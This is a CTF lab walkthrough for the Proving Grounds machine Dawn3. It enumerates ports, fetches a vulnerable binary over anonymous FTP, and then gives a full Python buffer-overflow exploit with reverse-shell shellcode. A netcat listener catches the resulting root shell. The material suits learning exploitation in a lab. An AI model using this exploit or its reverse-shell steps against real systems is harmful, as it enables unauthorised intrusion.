+++
title = "Dawn3 - PG Play"
description = "Proving Grounds Play Dawn3 Writeup|Walkthrough"
type = ["posts","post"]
tags = [
    "CTF",
    "PG-play",
    "Buffer Overflow",
    "OSCP"
]
date = "2021-12-20"
categories = [
    "PG-play",
    "BufferOverflow",
]
series = ["Proving_Grounds-Practice"]
[ author ]
  name = "d42kw01f"
+++

---

## Summary
> This machine is exploited via a vulnerable custom server that suffers from a stack-based buffer overflow. The attacker obtains a copy of the binary from an anonymous FTP server. After successful analysis and exploitation of the vulnerable binary, a root shell is obtained.

## Enumeration
### Nmap:
We start off by running a `nmap` scan against all TCP ports:
```bash
sudo nmap -p- 192.168.120.72
```
```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-16 15:52 EDT
Nmap scan report for 192.168.120.72
Host is up (0.029s latency).
PORT STATE SERVICE
2100/tcp open amiganetfs
6812/tcp open unknown
```
According to the `nmap` there are two ports are opened in the machine. The port `2100` is most likely to be a `FTP server` and other ports is unknown for the `nmap`.

#### Port `2100` Enumeration:
An anonymous FTP server is running on port 2100. After we connect (the password is blank), we are able to retrieve a copy of the custom server that is running on port 6812:
```bash
ftp 192.168.120.72 2100
```
```
Connected to 192.168.120.72.
220 pyftpdlib 1.5.6 ready.
Name (192.168.120.72:root): anonymous
331 Username ok, send password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 Active data connection established.
125 Data connection already open. Transfer starting.
-rwsrwxrwx 1 dawn3 dawn3 292728 Mar 08 18:22 dawn3.exe
226 Transfer complete.
```

There is an executable file called `dawn3.exe` can be found in the `ftp`. Let's Download the executable to the local machine for further enumeration.

```
ftp> get dawn3.exe
local: dawn3.exe remote: dawn3.exe
200 Active data connection established.
125 Data connection already open. Transfer starting.
226 Transfer complete.
292728 bytes received in 0.15 secs (1.8161 MB/s)
ftp> bye
221 Goodbye.
```

## Exploitation
The custom server, running on port 6812 is vulnerable to a stack-based buffer
overflow. Given a copy of the server, we can develop a proof-of-concept python
script that would exploit the vulnerable server for us. The PoC script is as
follows:

```python
#!/usr/bin/python2
import socket
import sys
import time
import struct
size = 524
host = "192.168.239.13"
shellcode = ("\xb8\xf6\x34\xd5\xa8\xdb\xc3\xd9\x74\x24\xf4\x5f\x31\xc9\xb1"
"\x12\x31\x47\x12\x03\x47\x12\x83\x31\x30\x37\x5d\x8c\xe2\x40"
"\x7d\xbd\x57\xfc\xe8\x43\xd1\xe3\x5d\x25\x2c\x63\x0e\xf0\x1e"
"\x5b\xfc\x82\x16\xdd\x07\xea\xa2\x16\xf8\xee\xda\x2a\xf8\xef"
"\xa1\xa2\x19\x5f\xb3\xe4\x88\xcc\x8f\x06\xa2\x13\x22\x88\xe6"
"\xbb\xd3\xa6\x75\x53\x44\x96\x56\xc1\xfd\x61\x4b\x57\xad\xf8"
"\x6d\xe7\x5a\x36\xed")
filler = "A" * size
eip = "\x13\x15\x50\x52"
offset = "C" * 4
nops = "\x90" * 10
inputBuffer = filler + eip + offset + nops + shellcode
print "\nSending evil buffer with %s bytes" % size

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, 6812))
print "[*] Sending Payload!"

s.send("%s\r\n" %inputBuffer)
s.close()

print "[*] Done!!!"
```

After we set up a `netcat` listener on port 4444, we can send the malicious payload
to the server and catch a reverse shell:
```bash
python poc.py 192.168.120.72
```
```
[*] Sending Payload!
```

Let's start the reverse shell:
```bash
nc -lvnp 4444
```
```
listening on [any] 4444 ...
192.168.120.72: inverse host lookup failed: Unknown host
connect to [192.168.118.3] from (UNKNOWN) [192.168.120.72] 53004
python -c 'import pty; pty.spawn("/bin/bash")'
root@dawn3:/root# id
id
uid=0(root) gid=0(root) groups=0(root)
```

## Escalation:
As we already have a root shell, no further privilege escalation is required.